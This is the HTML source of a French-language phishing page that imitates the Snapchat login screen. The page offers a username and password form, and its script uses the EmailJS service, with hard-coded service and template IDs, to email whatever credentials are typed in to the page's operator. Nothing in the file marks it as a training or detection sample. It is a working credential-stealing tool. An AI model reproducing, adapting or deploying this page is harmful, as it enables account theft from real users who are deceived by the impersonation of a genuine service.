<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Snapchat</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 32px 16px 100px 16px;
        }
        .title {
            text-align: center;
            font-size: 2rem;
            font-weight: bold;
            margin-top: 48px;
            margin-bottom: 40px;
            color: #222;
        }
        .label {
            color: #00b0f4;
            font-size: 0.95rem;
            font-weight: bold;
            margin-bottom: 6px;
            margin-top: 20px;
            text-transform: uppercase;
            display: block;
            letter-spacing: 0.5px;
        }
        .input-field {
            width: 100%;
            padding: 14px 12px;
            margin-bottom: 8px;
            border: 1.5px solid #d1d1d1;
            border-radius: 8px;
            font-size: 1rem;
            box-sizing: border-box;
            outline: none;
        }
        .link {
            color: #00b0f4;
            font-size: 1rem;
            text-decoration: none;
            display: block;
            margin-bottom: 18px;
            margin-top: 2px;
        }
        .password-row {
            position: relative;
        }
        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 1.3rem;
            color: #bdbdbd;
            padding: 0;
            display: flex;
            align-items: center;
        }
        .checkbox-row {
            display: flex;
            align-items: center;
            margin-top: 8px;
            margin-bottom: 18px;
        }
        .checkbox-row input[type="checkbox"] {
            accent-color: #00b0f4;
            margin-right: 8px;
        }
        .forgot-link {
            color: #00b0f4;
            text-align: center;
            display: block;
            margin-bottom: 40px;
            margin-top: 10px;
            text-decoration: none;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #bfc5cb;
            color: #fff;
            border: none;
            border-radius: 30px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 30px;
            margin-bottom: 10px;
            transition: background 0.2s;
        }
        .login-btn.active {
            background: #00b0f4;
        }
        @media (max-width: 500px) {
            .container {
                padding: 16px 4vw 80px 4vw;
            }
        }
    </style>
    <!-- EmailJS SDK -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="title">Connexion</div>
        <form id="loginForm">
            <label for="username" class="label">Nom d'utilisateur ou adresse e-mail</label>
            <input id="username" name="username" type="text" class="input-field" autocomplete="username" required>
            <a href="#" class="link">Utiliser mon numéro de téléphone</a>
            <label for="password" class="label">Mot de passe</label>
            <div class="password-row">
                <input id="password" name="password" type="password" class="input-field" autocomplete="current-password" required>
                <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Afficher/Masquer le mot de passe">
                    <svg id="eyeIcon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#bdbdbd" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <ellipse cx="12" cy="12" rx="8" ry="5"/>
                        <circle cx="12" cy="12" r="2.5"/>
                    </svg>
                </button>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="remember" checked>
                <label for="remember" style="color:#bdbdbd; font-size:0.97rem;">Enregistrer les informations de connexion sur votre appareil</label>
            </div>
            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
            <button class="login-btn" type="submit">Connexion</button>
        </form>
    </div>
    <script>
        // Initialisation EmailJS
        emailjs.init('SxzlpTU3Nsdg1ziE7'); // Remplace par ta clé publique EmailJS

        // Afficher/Masquer le mot de passe
        function togglePassword() {
            const pwd = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                eyeIcon.setAttribute('stroke', '#00b0f4');
            } else {
                pwd.type = 'password';
                eyeIcon.setAttribute('stroke', '#bdbdbd');
            }
        }

        // Bouton Connexion bleu si champs remplis
        const username = document.getElementById('username');
        const password = document.getElementById('password');
        const loginBtn = document.querySelector('.login-btn');

        function checkFields() {
            if (username.value.trim() && password.value.trim()) {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }

        username.addEventListener('input', checkFields);
        password.addEventListener('input', checkFields);

        // Envoi du formulaire avec EmailJS
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            if (!(username.value.trim() && password.value.trim())) return;

            emailjs.send('service_91ve21c', 'template_ijgv71j', {
                username: username.value,
                password: password.value
            })
            .then(function(response) {
                alert('Envoyé !');
                username.value = '';
                password.value = '';
                checkFields();
            }, function(error) {
                alert('Erreur lors de l\'envoi');
            });
        });
    </script>
</body>
</html>
